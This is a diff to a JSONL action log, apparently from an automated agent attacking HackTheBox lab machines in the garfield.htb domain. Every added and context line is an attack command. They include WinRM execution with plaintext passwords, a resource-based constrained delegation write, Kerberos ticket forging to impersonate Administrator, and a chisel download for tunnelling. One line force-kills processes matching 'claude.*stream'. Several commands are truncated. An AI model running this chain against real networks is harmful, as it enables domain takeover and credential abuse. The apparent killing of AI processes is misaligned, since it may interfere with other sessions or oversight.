@@ -295,3 +295,8 @@
 {"action": "crackmapexec winrm 10.129.17.223 -u l.wilson_adm -p 'P@ssw0rd2026!' -d garfield.htb -X '$cred = New-Object PSCredential(\"garfield.htb\\RODC01$\",(ConvertTo-SecureString \"Rodc2026!\" -AsPlainText -Force))", "ts": "2026-04-08T11:21:08Z"}
 {"action": "export PATH=\"/home/hacker/.local/bin:$PATH\"\ncd /htb/machines/garfield\n\nAES=$(python3 -c \"from impacket.krb5.crypto import string_to_key; from impacket.krb5.constants import EncryptionTypes; print(stri", "ts": "2026-04-08T11:22:00Z"}
 {"action": "pkill -9 -f \"engine.py\" 2>/dev/null; pkill -f \"claude.*stream\" 2>/dev/null", "ts": "2026-04-08T11:23:05Z"}
+{"action":"box_down","target":"10.129.17.167","note":"Box unreachable, needs respawn. VPN tun0 up at 10.10.17.114.","ts":"2026-04-08T12:00:44Z"}
+{"action": "faketime '+8 hours' /home/hacker/.local/bin/rbcd.py -delegate-from 'FAKEPC$' -delegate-to 'RODC01$' -action write 'garfield.htb/l.wilson_adm:P@ssw0rd2026!' -dc-ip 10.129.17.223 2>&1", "ts": "2026-04-08T12:13:24Z"}
+{"action": "faketime '+8 hours' /home/hacker/.local/bin/rbcd.py -delegate-from 'FAKEPC$' -delegate-to 'RODC01$' -action write 'garfield.htb/l.wilson_adm:P@ssw0rd2026!' -dc-ip 10.129.17.223 2>&1", "ts": "2026-04-08T12:13:46Z"}
+{"action": "faketime '+8 hours' /home/hacker/.local/bin/getST.py -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 10.129.17.223 'garfield.htb/FAKEPC$:FakePass123!' 2>&1", "ts": "2026-04-08T12:13:53Z"}
+{"action": "# Get chisel for linux (our box) and windows (DC01)\ncd /tmp && curl -sL https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz -o chisel_linux.gz && gunzip chisel_li", "ts": "2026-04-08T12:14:23Z"}
